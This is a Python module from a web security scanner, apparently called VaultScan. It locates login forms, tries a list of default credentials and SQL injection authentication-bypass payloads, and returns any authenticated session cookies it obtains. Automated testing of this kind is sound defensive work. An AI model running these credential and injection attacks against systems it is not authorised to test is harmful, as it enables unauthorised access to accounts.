#!/usr/bin/env python3
"""
VaultScan -- Authentication Discovery & Session Acquisition
=============================================================
Attempts to acquire an authenticated session before other scanners run.
Tries:
  1. Default/common credentials on login forms
  2. SQL injection auth bypass
  3. Registration of a new test account
  4. Guest/demo access detection

Outputs JSON with cookies if successful, empty array if no auth needed.
"""

import os
import sys
import re
import json
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scan_utils import (
    is_mock_mode, output_findings, output_error, base_argparser,
    normalize_url, create_session, safe_request, make_finding,
    extract_forms,
)

# Common credentials to try
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("test", "test"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("user", "user"),
    ("root", "root"),
    ("admin", "Admin123!"),
    ("bee", "bug"),           # bWAPP
    ("admin", "password1"),
    ("user", "password"),
    ("admin", "letmein"),
]

# SQL injection auth bypass payloads
SQLI_BYPASS = [
    ("' OR 1=1 --", "test"),
    ("admin'--", "test"),
    ("' OR '1'='1' --", "test"),
    ("admin' OR '1'='1", "test"),
    ("') OR ('1'='1", "test"),
    ("' OR 1=1#", "test"),
]

LOGIN_PATHS = [
    "", "/login", "/signin", "/auth/login", "/user/login",
    "/login.php", "/login.asp", "/login.aspx", "/login.jsp",
    "/admin/login", "/admin", "/wp-login.php", "/administrator",
    "/account/login", "/auth", "/api/auth/login",
]


def find_login_form(session, base_url: str, timeout: int) -> Optional[Dict]:
    """Find a login form on the target."""
    for path in LOGIN_PATHS:
        url = f"{base_url}{path}" if path else base_url
        resp, err = safe_request(session, "GET", url, timeout=timeout)
        if err or not resp or resp.status_code != 200:
            continue

        forms = extract_forms(url, resp.text)
        for form in forms:
            has_password = any(inp.get("type") == "password" for inp in form.get("inputs", []))
            if has_password:
                # Identify username and password fields
                username_field = None
                password_field = None
                other_fields = {}

                for inp in form.get("inputs", []):
                    name = inp.get("name")
                    if not name:
                        continue
                    inp_type = inp.get("type", "text")

                    if inp_type == "password":
                        password_field = name
                    elif inp_type in ("submit", "button", "image"):
                        other_fields[name] = inp.get("value", "")
                    elif inp_type == "hidden":
                        other_fields[name] = inp.get("value", "")
                    elif "user" in name.lower() or "email" in name.lower() or "login" in name.lower() or "name" in name.lower():
                        username_field = name
                    elif inp_type in ("text", "email"):
                        if not username_field:
                            username_field = name
                    else:
                        other_fields[name] = inp.get("value", "")

                if username_field and password_field:
                    return {
                        "url": url,
                        "action": form.get("action", url),
                        "method": form.get("method", "POST").upper(),
                        "username_field": username_field,
                        "password_field": password_field,
                        "other_fields": other_fields,
                    }

    return None


def check_login_success(session, resp, baseline_resp, login_form: Dict) -> bool:
    """Determine if a login attempt succeeded."""
    if not resp:
        return False

    # Check redirect to authenticated area
    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get("Location", "").lower()
        success_indicators = [
            "dashboard", "home", "main", "portal", "account",
            "welcome", "profile", "admin", "index", "panel",
        ]
        fail_indicators = ["login", "signin", "error", "fail", "auth"]

        if any(s in location for s in success_indicators):
            return True
        if any(f in location for f in fail_indicators):
            return False
        # Redirect to different page than login = probably success
        login_path = urlparse(login_form["url"]).path
        if location and login_path not in location:
            return True

    # Check response body for success indicators
    if resp.status_code == 200:
        body = resp.text[:3000].lower()
        success_words = ["welcome", "dashboard", "logout", "sign out", "log out", "my account", "profile"]
        fail_words = ["invalid", "incorrect", "wrong", "failed", "error", "try again"]

        has_success = any(w in body for w in success_words)
        has_fail = any(w in body for w in fail_words)

        if has_success and not has_fail:
            return True

        # Response significantly different from baseline (and bigger)
        if baseline_resp:
            baseline_len = len(baseline_resp.text)
            resp_len = len(resp.text)
            if resp_len > baseline_len * 1.3 and has_success:
                return True

    return False


def try_login(session, login_form: Dict, username: str, password: str, timeout: int, baseline_resp=None) -> Tuple[bool, Optional[str]]:
    """Attempt login with given credentials."""
    data = {
        **login_form["other_fields"],
        login_form["username_field"]: username,
        login_form["password_field"]: password,
    }

    method = login_form["method"]
    action = login_form["action"]

    if method == "POST":
        resp, err = safe_request(session, "POST", action, timeout=timeout, data=data, allow_redirects=True)
    else:
        resp, err = safe_request(session, "GET", action, timeout=timeout, params=data, allow_redirects=True)

    if err or not resp:
        return False, None

    if check_login_success(session, resp, baseline_resp, login_form):
        # Extract cookies
        cookies = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
        return True, cookies

    return False, None


def extract_user_credentials(session) -> tuple:
    """Extract credentials passed via custom headers from the UI."""
    username = None
    password = None
    login_url = None
    headers = dict(session.headers)
    for key, val in headers.items():
        if key.lower() == "x-vaultscan-username":
            username = val
        elif key.lower() == "x-vaultscan-password":
            password = val
        elif key.lower() == "x-vaultscan-loginurl":
            login_url = val
    # Remove these custom headers so they don't get sent to the target
    for h in ["X-VaultScan-Username", "X-VaultScan-Password", "X-VaultScan-LoginURL"]:
        session.headers.pop(h, None)
    return username, password, login_url


def attempt_auth(session, base_url: str, timeout: int) -> Dict:
    """Main auth discovery: try multiple strategies."""
    result = {
        "authenticated": False,
        "method": None,
        "cookies": None,
        "username": None,
        "findings": [],
    }

    # Step 1: Check if target requires auth at all
    resp, err = safe_request(session, "GET", base_url, timeout=timeout)
    if err or not resp:
        return result

    # If main page has lots of content and no login form, might not need auth
    body = resp.text.lower()
    has_login_keywords = any(w in body for w in ["login", "sign in", "log in", "username", "password"])

    if not has_login_keywords and len(resp.text) > 5000:
        # Probably doesn't require auth
        return result

    # Step 2: Find login form
    # Check if user provided a specific login URL
    user_username, user_password, user_login_url = extract_user_credentials(session)

    login_form = None
    if user_login_url:
        # Try user-specified login URL first
        resp, err = safe_request(session, "GET", user_login_url, timeout=timeout)
        if resp and resp.status_code == 200:
            forms = extract_forms(user_login_url, resp.text)
            for form in forms:
                has_pw = any(inp.get("type") == "password" for inp in form.get("inputs", []))
                if has_pw:
                    username_field = None
                    password_field = None
                    other_fields = {}
                    for inp in form.get("inputs", []):
                        name = inp.get("name")
                        if not name: continue
                        if inp.get("type") == "password":
                            password_field = name
                        elif inp.get("type") == "hidden":
                            other_fields[name] = inp.get("value", "")
                        elif inp.get("type") in ("submit", "button"):
                            other_fields[name] = inp.get("value", "")
                        elif not username_field:
                            username_field = name
                        else:
                            other_fields[name] = inp.get("value", "")
                    if username_field and password_field:
                        login_form = {
                            "url": user_login_url,
                            "action": form.get("action", user_login_url),
                            "method": form.get("method", "POST").upper(),
                            "username_field": username_field,
                            "password_field": password_field,
                            "other_fields": other_fields,
                        }
                        break

    if not login_form:
        login_form = find_login_form(session, base_url, timeout)

    if not login_form:
        return result

    result["findings"].append(make_finding(
        vulnerability="Login Form Detected",
        severity="LOW",
        location=login_form["url"],
        evidence=f"Login form found at {login_form['url']} with fields: {login_form['username_field']}, {login_form['password_field']}",
        category="AUTH_DISCOVERY",
    ))

    # Get baseline (failed login)
    baseline_session = create_session(timeout=timeout)
    baseline_data = {
        **login_form["other_fields"],
        login_form["username_field"]: "vaultscan_invalid_user_xyz",
        login_form["password_field"]: "vaultscan_invalid_pass_xyz",
    }
    baseline_resp, _ = safe_request(
        baseline_session, login_form["method"], login_form["action"],
        timeout=timeout, data=baseline_data, allow_redirects=True,
    )

    # Step 2.5: Try user-provided credentials FIRST (highest priority)
    if user_username and user_password:
        test_session = create_session(timeout=timeout)
        success, cookies_str = try_login(test_session, login_form, user_username, user_password, timeout, baseline_resp)
        if success:
            result["authenticated"] = True
            result["method"] = "user_credentials"
            result["cookies"] = cookies_str
            result["username"] = user_username
            result["findings"].append(make_finding(
                vulnerability="User Credentials Login Successful",
                severity="LOW",
                location=login_form["action"],
                evidence=f"Login successful with provided credentials ({user_username}). Authenticated session acquired for scanning.",
                category="AUTH_DISCOVERY",
                raw_details={"username": user_username, "form_action": login_form["action"]},
            ))
            return result
        else:
            result["findings"].append(make_finding(
                vulnerability="User Credentials Login Failed",
                severity="LOW",
                location=login_form["action"],
                evidence=f"Login with provided credentials ({user_username}) failed. Falling back to auto-detection.",
                category="AUTH_DISCOVERY",
            ))

    # Step 3: Try default credentials
    for username, password in DEFAULT_CREDS:
        test_session = create_session(timeout=timeout)
        success, cookies = try_login(test_session, login_form, username, password, timeout, baseline_resp)
        if success:
            result["authenticated"] = True
            result["method"] = "default_credentials"
            result["cookies"] = cookies
            result["username"] = username
            result["findings"].append(make_finding(
                vulnerability="Default Credentials Accepted",
                severity="CRITICAL",
                location=login_form["action"],
                evidence=f"Login successful with default credentials: {username}/{password}. Session cookies acquired for deep scanning.",
                category="AUTH_DISCOVERY",
                raw_details={"username": username, "form_action": login_form["action"]},
            ))
            return result

    # Step 4: Try SQL injection bypass
    for sqli_user, sqli_pass in SQLI_BYPASS:
        test_session = create_session(timeout=timeout)
        success, cookies = try_login(test_session, login_form, sqli_user, sqli_pass, timeout, baseline_resp)
        if success:
            result["authenticated"] = True
            result["method"] = "sqli_bypass"
            result["cookies"] = cookies
            result["username"] = sqli_user
            result["findings"].append(make_finding(
                vulnerability="SQL Injection Authentication Bypass",
                severity="CRITICAL",
                location=login_form["action"],
                evidence=f"Login bypassed with SQL injection payload: '{sqli_user}'. Session acquired for deep scanning.",
                category="AUTH_DISCOVERY",
                raw_details={"payload": sqli_user, "form_action": login_form["action"]},
            ))
            return result

    # Step 5: Check for registration page
    register_paths = ["/register", "/signup", "/user_new.php", "/create-account"]
    for path in register_paths:
        url = f"{base_url}{path}"
        resp, err = safe_request(session, "GET", url, timeout=timeout)
        if resp and resp.status_code == 200:
            forms = extract_forms(url, resp.text)
            if forms:
                result["findings"].append(make_finding(
                    vulnerability="Open Registration Available",
                    severity="MEDIUM",
                    location=url,
                    evidence=f"Registration page found at {url}. An attacker could create accounts to access authenticated functionality.",
                    category="AUTH_DISCOVERY",
                ))
                break

    return result


def get_mock_findings(target: str) -> List[Dict]:
    return [
        make_finding(
            vulnerability="Default Credentials Accepted",
            severity="CRITICAL",
            location=f"{target}/login",
            evidence="Login successful with default credentials: admin/admin. Session cookies acquired.",
            category="AUTH_DISCOVERY",
        ),
    ]


def main():
    parser = base_argparser("VaultScan Auth Discovery & Session Acquisition")
    args = parser.parse_args()
    target = normalize_url(args.target)

    if not target:
        output_error("No target specified.")

    if is_mock_mode():
        output_findings(get_mock_findings(target))

    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)

    result = attempt_auth(session, target, args.timeout)

    # Output: findings + auth result as a special finding with cookies
    findings = result["findings"]

    if result["authenticated"]:
        # Add a special finding that carries the cookies for the orchestrator
        findings.append({
            "vulnerability": "__AUTH_SESSION__",
            "severity": "INFO",
            "location": target,
            "evidence": result["cookies"] or "",
            "category": "AUTH_DISCOVERY",
            "raw_details": {
                "authenticated": True,
                "method": result["method"],
                "cookies": result["cookies"],
                "username": result["username"],
            },
        })

    output_findings(findings)


if __name__ == "__main__":
    main()
